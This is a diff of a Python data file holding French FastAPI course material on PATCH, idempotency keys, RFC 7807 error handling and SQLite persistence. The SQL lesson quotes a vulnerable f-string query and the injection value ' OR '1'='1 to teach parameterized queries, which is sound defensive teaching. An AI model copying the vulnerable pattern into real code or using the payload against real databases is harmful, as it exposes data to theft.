+                    "méthode **`PUT`** ordonne le **remplacement intégral** de la représentation stockée à cette adresse "
+                    "par le document joint dans la requête : le client est tenu de transmettre tous les champs du schéma, "
+                    "et tout champ optionnel omis est légitimement réinitialisé à sa valeur par défaut.\n\n"
+                    "À l'inverse, la méthode **`PATCH` (IETF RFC 5789)** exprime un **différentiel partiel** : si un "
+                    "coordinateur souhaite uniquement transférer la formation dans la `\"Salle B\"`, il n'expédie que "
+                    "`{\"salle\": \"Salle B\"}` en exigeant que le `titre` et la `duree_jours` demeurent strictement "
+                    "inchangés.\n\n"
+                    "#### Le registre interne `model_fields_set` de Pydantic v2\n\n"
+                    "Si vous définissez un modèle `FormationPatch` où chaque attribut vaut `None` par défaut "
+                    "(`titre: str | None = None`) et que vous appliquez naïvement `payload.model_dump()`, tous les champs "
+                    "omis ressortent à `None` et détruisent votre base de données ! Pydantic v2 résout brillamment cette "
+                    "ambiguïté en mémorisant dans `payload.model_fields_set` l'ensemble exact des clés physiquement "
+                    "présentes dans le JSON reçu.\n\n"
+                    "```python — Extraction chirurgicale des seuls champs envoyés par le client\n"
+                    "class FormationPatch(BaseModel):\n"
+                    "    titre: str | None = Field(default=None, min_length=3)\n"
+                    "    duree_jours: int | None = Field(default=None, ge=1, le=30)\n"
+                    "    salle: str | None = None\n\n"
+                    "# Si le client envoie uniquement {\"salle\": \"Salle B\"} :\n"
+                    "modifications = payload.model_dump(exclude_unset=True)  # -> {'salle': 'Salle B'}\n"
+                    "```"
                 )
             },
             {
-                "heading": "2. Le problème critique de la non-idempotence de `POST` sur les réseaux instables",
+                "heading": "2. Le péril des pannes grises (*Ack Lost*) sur les mutations `POST` non idempotentes",
                 "body": (
-                    "Imaginez le scénario réel suivant :\n"
-                    "1. Une application mobile envoie `POST /api/v1/paiements` (`{\"montant\": 25000}`).\n"
-                    "2. Le serveur FastAPI reçoit la requête, débite les 25 000 DZD et renvoie `201 Created`.\n"
-                    "3. Mais au moment où la réponse traverse le tunnel 4G du téléphone, la connexion coupe ! L'application "
-                    "mobile reçoit une erreur `Network Timeout`.\n"
-                    "4. L'application mobile ne sait pas si le serveur a reçu la requête ou non : elle renvoie donc le même "
-                    "`POST /api/v1/paiements` par sécurité. Sans protection, le client est débité **deux fois (50 000 DZD)** !"
+                    "En algèbre protocolaire (RFC 9110, Section 9.2.2), une opération est dite **idempotente** lorsque "
+                    "l'appliquer une fois ou dix fois consécutives avec la même charge utile laisse le serveur dans un "
+                    "**état final strictement identique** : `GET`, `PUT` et `DELETE` possèdent naturellement cette "
+                    "propriété. Le verbe **`POST`**, en revanche, n'est **pas idempotent** : chaque réception crée par "
+                    "défaut une nouvelle ligne SQL ou déclenche un nouveau virement.\n\n"
+                    "Considérons la panne dite de « perte d'accusé de réception » (*Lost Acknowledgment*), quotidienne "
+                    "sur les réseaux cellulaires : l'application mobile émet `POST /api/v1/paiements` (`25 000 DZD`), "
+                    "votre worker FastAPI valide la transaction en base et expédie `201 Created`, mais le tunnel radio 4G "
+                    "bascule d'antenne avant que les octets de réponse n'atteignent le téléphone. Recevant une exception "
+                    "`ReadTimeout`, le SDK mobile ignore si le paquet s'est perdu à l'aller ou au retour : s'il "
+                    "réessaie automatiquement sans garde-fou, le compte bancaire est débité une seconde fois !"
                 )
             },
             {
-                "heading": "3. La solution industrielle : l'en-tête `Idempotency-Key` (Standard IETF / Stripe)",
+                "heading": "3. Machine à états d'idempotence : l'en-tête `Idempotency-Key` (Standard IETF / Stripe)",
                 "body": (
-                    "Pour rendre `POST` idempotent sans jamais créer de doublon :\n"
-                    "1. Avant d'envoyer sa requête `POST`, le client génère un identifiant unique (`UUID v4`, ex: `Idempotency-Key: tx-99812-a4b2`).\n"
-                    "2. Lors du 1er appel, le serveur vérifie si `tx-99812-a4b2` existe dans son cache d'idempotence. Comme "
-                    "elle est nouvelle, il exécute le paiement et **mémorise le résultat exact associé à cette clé**.\n"
-                    "3. Si le client renvoie la même requête avec la même `Idempotency-Key: tx-99812-a4b2`, le serveur reconnaît "
-                    "la clé, **n'exécute PAS une seconde fois le paiement**, et renvoie immédiatement la réponse initiale mise en cache !"
+                    "Pour conférer une idempotence mathématique à `POST`, l'industrie financière (Stripe, Adyen, PayPal "
+                    "et le brouillon normatif IETF *Idempotency-Key HTTP Header Field*) déporte la génération d'un "
+                    "jeton d'intention unique côté appelant.\n\n"
+                    "> [!WARNING] L'`Idempotency-Key` doit impérativement être forgée par le Client avant le 1er essai\n"
+                    "> Au moment précis où l'utilisateur presse « Payer », le client génère un `UUID v4` (`Idempotency-Key: 9b2f4e10-7c1a...`) et le conserve pour toute tentative de réessai de cette même opération. Ce n'est qu'une fois une toute nouvelle intention initiée qu'un nouvel UUID est tiré.\n\n"
+                    "Côté FastAPI, le serveur inspecte cet en-tête avant toute écriture : si la clé est absente du "
+                    "magasin d'idempotence (table SQL contrainte `UNIQUE` ou cache **Redis** assorti d'un TTL de 24 h "
+                    "et d'une empreinte SHA-256 du corps JSON pour détecter toute réutilisation erronée de la clé sur un "
+                    "autre montant), la transaction est exécutée et sa réponse exacte (`status_code` + corps sérialisé) "
+                    "est scellée sous cette clé. Lorsqu'un réessai porteur du même `Idempotency-Key` se présente, "
+                    "FastAPI court-circuite intégralement le moteur métier et rejoue la réponse mise en cache en y "
+                    "adjoignant l'en-tête d'audit `X-Idempotent-Replay: true`."
                 )
             }
         ],
@@ -676,8 +857,8 @@ ENRICHMENT_D2_D3 = {
             }
         ],
         "practical_exercises": [
-            "Exécutez le script dans l'atelier ci-dessus pour observer comment les deux appels `POST` portant la même `Idempotency-Key` produisent une seule transaction.",
-            "Dans l'onglet **curl & Postman**, testez la commande `2.4 — PATCH` pour modifier uniquement la salle de la formation `#1`."
+            "Exécutez le script dans l'atelier ci-dessus pour constater que deux requêtes `POST` successives partageant la même `Idempotency-Key` n'incrémentent le compteur de transactions qu'une seule fois.",
+            "Dans l'onglet **curl & Postman**, exécutez la requête `PATCH` sur `/api/sandbox/formations/1` afin de modifier exclusivement la salle tout en vérifiant que le titre demeure intact."
         ]
     },
 
@@ -686,41 +867,73 @@ ENRICHMENT_D2_D3 = {
     # =========================================================================
     "d3-l3": {
         "context": (
-            "Pour qu'une API d'entreprise soit prévisible pour les applications mobiles et partenaires, toutes ses "
-            "réponses d'erreur (`404 Not Found`, `405 Method Not Allowed`, `422 Unprocessable Entity` et `500 Internal Server Error`) "
-            "doivent respecter exactement le même schéma **RFC 7807 (`application/problem+json`)**.\n"
-            "De plus, si une erreur imprévue (`ZeroDivisionError`, panne SQL) survient en production, le serveur ne doit "
-            "jamais divulguer son code source ou ses chemins internes dans la réponse HTTP. Ce chapitre montre comment "
-            "centraliser toutes les erreurs avec **`@app.exception_handler`** dans FastAPI."
+            "Un contrat d'API ne se juge pas à l'élégance de ses réponses `200 OK`, mais à la cohérence irréprochable "
+            "de ses défaillances. Par défaut, lorsqu'une URL est introuvable (`404`), qu'un verbe HTTP est rejeté "
+            "(`405`), qu'un corps échoue à la validation Pydantic (`422`) ou qu'une exception Python imprévue éclate "
+            "(`500`), les structures de réponse diffèrent (`{\"detail\": \"Not Found\"}` contre un tableau `detail: [...]` "
+            "ou du texte brut `Internal Server Error`), brisant les analyseurs d'erreurs des SDK clients.\n\n"
+            "Plus critique encore sur le plan de la sécurité (référentiel **MITRE CWE-209 — Information Exposure "
+            "Through an Error Message**), laisser fuiter une trace d'exécution Python ou un message d'erreur SQL brut "
+            "offre à un attaquant la cartographie exacte de vos tables et de vos chemins disque. Ce chapitre orchestre "
+            "le bouclier global **`@app.exception_handler`** de FastAPI et Starlette."
         ),
         "deep_sections": [
             {
-                "heading": "1. Intercepter les erreurs HTTP et de routage (`@app.exception_handler(StarletteHTTPException)`)",
+                "heading": "1. Hiérarchie d'interception de Starlette : `ExceptionMiddleware` contre `ServerErrorMiddleware`",
                 "body": (
-                    "Lorsqu'une requête cible une URL inconnue (`404`), utilise un verbe non supporté (`405`) ou lève `raise HTTPException(...)` :\n"
-                    "- En déclarant `@app.exception_handler(StarletteHTTPException)`, vous interceptez toutes les exceptions HTTP de Starlette et FastAPI.\n"
-                    "- Vous retournez alors un `JSONResponse(status_code=exc.status_code, media_type=\"application/problem+json\", content={...})` "
-                    "incluant `type`, `title`, `status`, `detail` et `instance` (`request.url.path`)."
+                    "Pour maîtriser la gestion d'erreurs dans FastAPI, il faut comprendre que Starlette superpose deux "
+                    "filets distincts autour de vos routes. Le filet interne, **`ExceptionMiddleware`**, intercepte "
+                    "toutes les exceptions métier et protocolaires connues : `StarletteHTTPException` (qui englobe les "
+                    "`404` et `405` générés par le routeur ainsi que vos propres `fastapi.HTTPException`) et "
+                    "`RequestValidationError` (levée par Pydantic v2).\n\n"
+                    "En déclarant **`@app.exception_handler(StarletteHTTPException)`** — attention à bien cibler la "
+                    "classe de base `starlette.exceptions.HTTPException` plutôt que la seule sous-classe "
+                    "`fastapi.HTTPException` si vous voulez intercepter aussi les `404` d'URL inconnues et les `405` "
+                    "automatiques du routeur ! — vous unifiez l'intégralité des erreurs `4xx` sous une enveloppe unique "
+                    "**`application/problem+json` (RFC 7807)**."
                 )
             },
             {
-                "heading": "2. Le Filet de Sécurité Ultime : `@app.exception_handler(Exception)` et Masquage `500`",
+                "heading": "2. Le filet ultime `@app.exception_handler(Exception)` et le cloisonnement anti-fuite `500`",
                 "body": (
-                    "Que se passe-t-il si un bug imprévu (une division par zéro ou une base SQL momentanément verrouillée) "
-                    "survient au milieu d'une route en production ?\n"
-                    "Grâce à `@app.exception_handler(Exception)` :\n"
-                    "1. Vous enregistrez la trace complète du bug dans les journaux internes du serveur avec un identifiant de corrélation `req_id`.\n"
-                    "2. Vous renvoyez au client un `JSONResponse` propre **`500 Internal Server Error`** au format RFC 7807 qui ne divulgue **aucun secret "
-                    "ni chemin de fichier interne**."
+                    "Le filet externe de Starlette, **`ServerErrorMiddleware`**, capture quant à lui les bogues "
+                    "imprévus non anticipés par le développeur (`ZeroDivisionError`, `KeyError`, rupture de socket "
+                    "PostgreSQL). En enregistrant `@app.exception_handler(Exception)`, vous prenez le contrôle absolu "
+                    "de cette ultime frontière avant que le serveur n'émette un `500` générique en texte brut.\n\n"
+                    "```python — Cloisonnement strict entre journalisation interne et réponse publique RFC 7807\n"
+                    "@app.exception_handler(Exception)\n"
+                    "async def capturer_erreur_500(request: Request, exc: Exception) -> JSONResponse:\n"
+                    "    req_id = getattr(request.state, \"request_id\", \"req-inconnu\")\n"
+                    "    logger.exception(\"Incident critique [%s] sur %s\", req_id, request.url.path)\n"
+                    "    return JSONResponse(\n"
+                    "        status_code=500,\n"
+                    "        media_type=\"application/problem+json\",\n"
+                    "        content={\n"
+                    "            \"type\": \"https://api.isgp.dz/erreurs/erreur-interne\",\n"
+                    "            \"title\": \"Erreur interne du serveur\",\n"
+                    "            \"status\": 500,\n"
+                    "            \"detail\": \"Une anomalie technique a été enregistrée par nos équipes.\",\n"
+                    "            \"request_id\": req_id,\n"
+                    "        },\n"
+                    "    )\n"
+                    "```\n\n"
+                    "> [!WARNING] Subtilité de test : `TestClient(app, raise_server_exceptions=False)`\n"
+                    "> Par défaut, `TestClient(app)` propage volontairement les exceptions Python `500` jusque dans votre script `pytest` afin de faciliter le débogage local. Pour vérifier dans un test automatisé que votre `@app.exception_handler(Exception)` renvoie bien un JSON RFC 7807 propre sans pile d'exécution, instanciez impérativement `TestClient(app, raise_server_exceptions=False)`."
                 )
             },
             {
-                "heading": "3. Traçabilité et Corrélation des Incidents en Production (`X-Request-ID`)",
+                "heading": "3. Diagnostic chirurgical en production par corrélation croisée (`request_id`)",
                 "body": (
-                    "Lorsqu'un client reçoit une réponse générique `500 Internal Server Error` masquée pour des raisons de sécurité, "
-                    "comment l'équipe de support technique retrouve-t-elle l'erreur exacte parmi des millions de lignes de logs serveur ?\n"
-                    "- En cas d'exception `500`, l'identifiant `request_id` est inscrit simultanément dans le fichier de log privé **et** dans le JSON "
-                    "renvoyé au client (`\"request_id\": \"req-8f2a9c01\"`), permettant un diagnostic instantané sans exposer la pile d'exécution."
+                    "Masquer les détails techniques au client protège votre infrastructure contre la reconnaissance "
+                    "offensive, mais ne doit jamais aveugler vos propres ingénieurs d'exploitation. La clé de voûte "
+                    "réside dans le couplage entre votre middleware d'audit (Chapitre 2.4) et vos gestionnaires "
+                    "d'exceptions.\n\n"
+                    "Lorsqu'une exception `500` survient à 03h14 du matin, `logger.exception(...)` consigne l'intégralité "
+                    "de la pile d'appels Python (*Traceback*), les variables de contexte et le `request_id` dans votre "
+                    "puits de logs sécurisé (fichiers tournants, Loki ou Elasticsearch), tandis que le client reçoit "
+                    "uniquement la référence inoffensive `\"request_id\": \"req-8f2a9c01\"`. Dès qu'un partenaire "
+                    "communique cette référence au support, la cause racine est localisée en quelques secondes sans "
+                    "qu'aucun secret architectural n'ait jamais franchi Internet."
                 )
             }
         ],
@@ -757,8 +970,8 @@ ENRICHMENT_D2_D3 = {
             }
         ],
         "practical_exercises": [
-            "Exécutez le script dans l'atelier ci-dessus pour vérifier que les erreurs `404`, `405`, `422` et `500` renvoient toutes `application/problem+json`.",
-            "Testez `GET /api/sandbox/formations/999` dans le Client HTTP pour observer une réponse `404` en JSON."
+            "Exécutez le script dans l'atelier ci-dessus et vérifiez que les quatre scénarios d'échec (`404`, `405`, `422` et `500`) produisent tous l'en-tête `content-type: application/problem+json`.",
+            "Interrogez `GET /api/sandbox/formations/999` dans le Client HTTP intégré pour inspecter la réponse normalisée renvoyée sur une entité absente."
         ]
     },
 
@@ -767,52 +980,72 @@ ENRICHMENT_D2_D3 = {
     # =========================================================================
     "d3-l4": {
         "context": (
-            "Stocker les données dans une liste Python `FORMATIONS = [...]` présente une limite rédhibitoire : la "
-            "liste réside en mémoire vive (RAM). Dès que vous redémarrez le serveur FastAPI/Uvicorn ou qu'une coupure électrique "
-            "survient, toutes les formations créées par vos utilisateurs disparaissent !\n"
-            "Pour conserver les données de manière durable sur disque dur tout en garantissant l'intégrité des écritures "
-            "concurrentes, toute API s'appuie sur un **Système de Gestion de Base de Données Relationnelle (SGBDR)** "
-            "interrogé en langage **SQL**. Python intègre nativement le moteur transactionnel **SQLite (`sqlite3`)**, "
-            "idéal pour apprendre les patrons d'accès aux bases de données et la prévention des **Injections SQL**."
+            "Maintenir un catalogue dans une liste Python `FORMATIONS = [...]` souffre de deux vices rédhibitoires en "
+            "production : d'une part, la mémoire vive (RAM) est **volatile** — le moindre redémarrage de déploiement "
+            "ou redimensionnement de conteneur anéantit toutes les écritures effectuées par les usagers ; d'autre part, "
+            "lorsque quatre processus workers Uvicorn tournent en parallèle, chacun possède son propre espace mémoire "
+            "isolé et ne voit jamais les ajouts réalisés chez ses voisins.\n\n"
+            "La persistance durable et partagée exige un **Système de Gestion de Base de Données Relationnelle "
+            "(SGBDR)** gouverné par des transactions **ACID**. La bibliothèque standard Python embarque nativement le "
+            "moteur C transactionnel **SQLite (`sqlite3`)**, offrant un terrain rigoureux pour maîtriser le cycle de "
+            "vie des connexions par `Depends(get_db)` avec `yield`, l'intégrité référentielle et l'éradication "
+            "mathématique des **Injections SQL**."
         ),
         "deep_sections": [
             {
-                "heading": "1. Le cycle d'une Transaction SQL (`connect` → `execute` → `commit` / `rollback` → `close`)",
+                "heading": "1. Garanties transactionnelles ACID, journalisation WAL et injection `Depends(get_db)` avec `yield`",
                 "body": (
-                    "Une base de données relationnelle garantit les propriétés **ACID** (*Atomicité, Cohérence, Isolation, Durabilité*) :\n"
-                    "- **Atomicité (`commit` vs `rollback`)** : Imaginez un virement bancaire composé de deux requêtes SQL "
-                    "(débiter le compte A, puis créditer le compte B). Si une erreur survient entre les deux, `conn.rollback()` "
-                    "annule tout comme si rien ne s'était passé ! Les modifications ne deviennent permanentes sur le disque "
-                    "qu'au moment précis de l'appel à **`conn.commit()`**.\n"
-                    "- **`conn.row_factory = sqlite3.Row`** : Par défaut, `sqlite3` renvoie chaque ligne sous forme de tuple "
-                    "anonyme `(1, 'API FastAPI', 5)`. En activant `sqlite3.Row`, chaque ligne se comporte comme un dictionnaire "
-                    "convertible instantanément par `dict(row)` -> `{\"id\": 1, \"titre\": \"API FastAPI\", \"duree_jours\": 5}` !"
+                    "Contrairement à un simple fichier JSON réécrit sur disque (qui finirait tronqué et illisible si "
+                    "une coupure électrique survenait au milieu de `write()`), un moteur relationnel comme SQLite ou "
+                    "PostgreSQL organise ses données en pages d'arbres équilibrés (**B-Trees**) protégées par un journal "
+                    "de transactions garantissant les quatre invariants **ACID** (*Atomicité, Cohérence, Isolation, "
+                    "Durabilité*).\n\n"
+                    "L'**Atomicité** assure qu'une séquence d'écritures liées — débiter un budget formation puis "
+                    "inscrire le stagiaire — réussit intégralement au moment précis de `conn.commit()`, ou est annulée "
+                    "sans laisser la moindre trace partielle via `conn.rollback()`. En activant en outre le mode "
+                    "`PRAGMA journal_mode=WAL;` (*Write-Ahead Logging*) et `conn.row_factory = sqlite3.Row`, SQLite "
+                    "autorise les lectures concurrentes pendant une écriture et restitue des lignes directement "
+                    "convertibles en dictionnaires JSON (`dict(row)`).\n\n"
+                    "```python — Gestionnaire de connexion déterministe injecté par FastAPI (Depends + yield)\n"
+                    "def get_db():\n"
+                    "    conn = sqlite3.connect(DB_PATH, check_same_thread=False)\n"
+                    "    conn.row_factory = sqlite3.Row\n"
+                    "    try:\n"
+                    "        yield conn\n"
+                    "    finally:\n"
+                    "        conn.close()  # Exécuté systématiquement après la réponse HTTP, même en cas d'exception !\n"
+                    "```"
                 )
             },
             {
-                "heading": "2. Anatomie d'une Attaque par Injection SQL (SQLi) et pourquoi `?` la rend impossible",
+                "heading": "2. Compilation de l'arbre syntaxique SQL (AST) : pourquoi les requêtes paramétrées `?` rendent la SQLi impossible",
                 "body": (
-                    "L'**Injection SQL** est l'une des vulnérabilités les plus destructrices de l'histoire de l'informatique :\n"
-                    "- **Code vulnérable (Concaténation `f\"...\"`)** :\n"
-                    "  `conn.execute(f\"SELECT * FROM formations WHERE salle = '{salle}'\")`\n"
-                    "  Si un attaquant envoie `salle = \"' OR '1'='1\"`, la requête SQL exécutée devient :\n"
-                    "  `SELECT * FROM formations WHERE salle = '' OR '1'='1'` !\n"
-                    "  Comme `'1'='1'` est toujours vrai, la base de données renvoie **100 % de la table** (ou exécute `DROP TABLE` si `executescript` est utilisé) !\n"
-                    "- **Code inviolable (Requête Paramétrée avec `?`)** :\n"
-                    "  `conn.execute(\"SELECT * FROM formations WHERE salle = ?\", (salle,))`\n"
-                    "  Ici, le moteur SQLite compile d'abord la structure de la commande SQL avec le marqueur `?`, puis "
-                    "insère la valeur de `salle` **exclusivement comme une donnée littérale inoffensive**, sans jamais "
-                    "l'interpréter comme une instruction SQL."
+                    "Classée depuis deux décennies au sommet des vulnérabilités critiques par l'**OWASP**, l'**Injection "
+                    "SQL (*SQLi*)** naît d'une confusion fatale entre **le code exécutable** (la grammaire SQL) et **les "
+                    "données passives** (la saisie de l'utilisateur).\n\n"
+                    "Lorsqu'un développeur assemble une requête par concaténation ou *f-string* — "
+                    "`conn.execute(f\"SELECT * FROM formations WHERE salle = '{salle}'\")` — il livre au compilateur "
+                    "SQL une chaîne monolithique. Si un attaquant transmet `salle = \"' OR '1'='1\"`, l'apostrophe "
+                    "referme prématurément le littéral texte et greffe un nouvel opérateur logique `OR '1'='1'` directement "
+                    "dans l'**Arbre Syntaxique Abstrait (AST)** de la requête : le prédicat devenant tautologique, "
+                    "la base restitue l'intégralité de ses tables confidentielles !\n\n"
+                    "> [!IMPORTANT] Séparation physique du code et de la donnée par liaison de paramètres (`?`)\n"
+                    "> Avec `conn.execute(\"SELECT * FROM formations WHERE salle = ?\", (salle,))`, le moteur C de SQLite **compile et fige l'AST de la requête SQL avant même de regarder la variable `salle`**. Lors de la phase d'exécution (*bind*), les octets de `salle` sont injectés directement dans le registre de valeur du nœud feuille `?` : il est structurellement impossible qu'une apostrophe ou un mot-clé `DROP TABLE` modifie l'arbre d'instructions déjà compilé."
                 )
             },
             {
-                "heading": "3. Gestion des contraintes d'intégrité (`sqlite3.IntegrityError`) et code HTTP `409 Conflict`",
+                "heading": "3. Invariants déclaratifs du schéma SQL (`UNIQUE`, `CHECK`) et traduction vers `409 Conflict`",
                 "body": (
-                    "Dans un schéma SQL professionnel, on définit des contraintes strictes sur les colonnes : `NOT NULL`, "
-                    "`UNIQUE` (ex: le code officiel d'une formation ou l'adresse e-mail d'un étudiant) et `CHECK (duree_jours > 0)`.\n"
-                    "- Si un client tente d'insérer une seconde formation avec un code déjà existant, SQLite lève `sqlite3.IntegrityError`.\n"
-                    "- Plutôt que de laisser cette exception provoquer une erreur `500`, la route intercepte `except sqlite3.IntegrityError:` "
-                    "et renvoie un code sémantique **`409 Conflict`** expliquant clairement quel champ unique est en doublon."
+                    "La validation Pydantic à l'entrée de FastAPI vérifie la forme intrinsèque du payload, mais seule la "
+                    "base de données détient la vérité concurrente permettant de garantir l'unicité d'un matricule ou "
+                    "d'un code catalogue lorsque deux requêtes arrivent à la même milliseconde. Un schéma relationnel "
+                    "robuste déclare donc ses garde-fous directement dans le DDL SQL : `NOT NULL`, `UNIQUE` sur les "
+                    "identifiants métier naturels, `CHECK (duree_jours BETWEEN 1 AND 30)` et `FOREIGN KEY`.\n\n"
+                    "Lorsqu'une insertion viole une contrainte `UNIQUE`, le pilote Python lève instantanément "
+                    "`sqlite3.IntegrityError`. Plutôt que de laisser cette exception remonter vers un `500 Internal "
+                    "Server Error`, l'ingénieur backend l'intercepte dans un bloc `try ... except sqlite3.IntegrityError:` "
+                    "(accompagné d'un `conn.rollback()`) et émet une réponse HTTP **`409 Conflict`** au format RFC 7807, "
+                    "informant proprement le client que la ressource entre en collision avec un enregistrement existant."
                 )
             }
         ],
@@ -832,9 +1065,9 @@ ENRICHMENT_D2_D3 = {
             "rows": [
                 ["**Create** (Créer)", "`POST /api/formations`", "`cur.execute(\"INSERT INTO formations (titre, salle) VALUES (?, ?)\", (t, s))` + `conn.commit()`", "`new_id = cur.lastrowid`"],
                 ["**Read All** (Lister)", "`GET /api/formations`", "`conn.execute(\"SELECT * FROM formations LIMIT ? OFFSET ?\", (limit, offset))`", "`[dict(r) for r in cur.fetchall()]`"],
-                ["**Read One** (Lire 1)", "`GET /api/formations/<id>`", "`conn.execute(\"SELECT * FROM formations WHERE id = ?\", (id,))`", "`row = cur.fetchone()` (`404` si `None`)"],
-                ["**Update** (Modifier)", "`PUT /api/formations/<id>`", "`conn.execute(\"UPDATE formations SET titre = ?, salle = ? WHERE id = ?\", (t, s, id))` + `conn.commit()`", "`cur.rowcount`"],
-                ["**Delete** (Supprimer)", "`DELETE /api/formations/<id>`", "`conn.execute(\"DELETE FROM formations WHERE id = ?\", (id,))` + `conn.commit()`", "`200 OK` ou `204 No Content`"]
+                ["**Read One** (Lire 1)", "`GET /api/formations/{id}`", "`conn.execute(\"SELECT * FROM formations WHERE id = ?\", (id,))`", "`row = cur.fetchone()` (`404` si `None`)"],
+                ["**Update** (Modifier)", "`PUT /api/formations/{id}`", "`conn.execute(\"UPDATE formations SET titre = ?, salle = ? WHERE id = ?\", (t, s, id))` + `conn.commit()`", "`cur.rowcount`"],
+                ["**Delete** (Supprimer)", "`DELETE /api/formations/{id}`", "`conn.execute(\"DELETE FROM formations WHERE id = ?\", (id,))` + `conn.commit()`", "`200 OK` ou `204 No Content`"]
             ]
         },
         "pitfalls": [
@@ -850,8 +1083,8 @@ ENRICHMENT_D2_D3 = {
             }
         ],
         "practical_exercises": [
-            "Exécutez la démonstration d'Injection SQL dans l'atelier ci-dessus et comparez le nombre de lignes renvoyées entre la requête vulnérable et la requête paramétrée.",
-            "Testez le cycle complet `POST` -> `PUT` -> `GET` sur `/api/sandbox/formations` dans l'onglet **Client HTTP & Inspecteur**."
+            "Exécutez la démonstration comparative dans l'atelier ci-dessus pour constater l'exfiltration provoquée par une f-string SQL face à l'étanchéité totale du marqueur paramétré `?`.",
+            "Enchaînez un cycle complet `POST` -> `PUT` -> `GET` -> `DELETE` sur `/api/sandbox/formations` depuis le **Client HTTP & Inspecteur** pour éprouver la persistance transactionnelle."
         ]
     }
 }
